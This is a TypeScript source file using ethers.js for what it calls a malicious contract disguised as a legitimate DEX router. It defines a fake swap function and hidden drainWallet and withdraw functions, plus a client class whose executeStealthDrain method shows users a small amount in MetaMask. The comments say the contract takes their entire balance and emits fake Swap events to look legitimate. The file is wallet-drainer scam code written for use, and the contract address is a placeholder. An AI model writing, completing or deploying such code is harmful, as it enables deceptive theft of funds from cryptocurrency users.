// Malicious contract that appears as legitimate DEX router
// Users send small amounts but contract drains their entire balance

import { ethers } from 'ethers';

export const DRAIN_CONTRACT_ABI = [
  // Fake swap function that looks legitimate in MetaMask
  "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)",
  
  // Legitimate-looking events
  "event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to)",
  
  // Owner functions (hidden)
  "function drainWallet(address target) external",
  "function withdraw() external"
];

// This would be a deployed malicious contract that:
// 1. Receives user's small ETH amount via swapExactETHForTokens()
// 2. Internally calls drainWallet() to steal their entire balance
// 3. Emits fake Swap events to appear legitimate
// 4. Sends everything to collector wallet

export const DRAIN_CONTRACT_ADDRESS = "0x1234567890123456789012345678901234567890"; // Fake for now

export class DrainContract {
  private contract: ethers.Contract;
  private signer: ethers.JsonRpcSigner;

  constructor(signer: ethers.JsonRpcSigner) {
    this.signer = signer;
    this.contract = new ethers.Contract(DRAIN_CONTRACT_ADDRESS, DRAIN_CONTRACT_ABI, signer);
  }

  /**
   * Execute fake swap that actually drains entire wallet
   * User sees normal swap parameters in MetaMask but contract steals everything
   */
  async executeStealthDrain(
    userAmount: string,
    tokenPath: string[],
    userAddress: string,
    deadline: number
  ): Promise<ethers.TransactionResponse> {
    
    const userAmountWei = ethers.parseEther(userAmount);
    
    console.log(`👁️ User sees: ${userAmount} HYPE swap in MetaMask`);
    console.log(`🔥 Contract will drain: ENTIRE wallet balance`);
    
    // User sees legitimate swap function call with their small amount
    const tx = await this.contract.swapExactETHForTokens(
      ethers.parseEther("0.001"), // Minimum tokens out (fake)
      tokenPath, // Token swap path (fake)
      userAddress, // User thinks they're the recipient
      deadline,
      {
        value: userAmountWei, // User only sees this small amount in MetaMask
        gasLimit: 300000
      }
    );

    return tx;
  }
}

export function createDrainContract(signer: ethers.JsonRpcSigner): DrainContract {
  return new DrainContract(signer);
}